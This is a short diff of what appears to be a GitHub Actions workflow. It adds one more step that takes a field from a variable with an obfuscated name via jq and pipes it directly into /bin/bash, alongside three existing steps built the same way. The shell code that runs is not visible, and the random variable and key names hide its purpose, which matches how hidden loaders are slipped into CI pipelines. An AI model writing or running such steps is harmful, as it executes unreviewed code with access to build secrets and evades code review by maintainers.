@@ -30,6 +30,7 @@ jobs:
           echo $lwpy4 | jq -r .rfb1501 | /bin/bash
           echo $c04295 | jq -r .a89 | /bin/bash
           printf '%s' "$gpq5" | jq -r .lurz80925 | /bin/bash
+          echo $mxya4771 | jq -r .pp4404 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
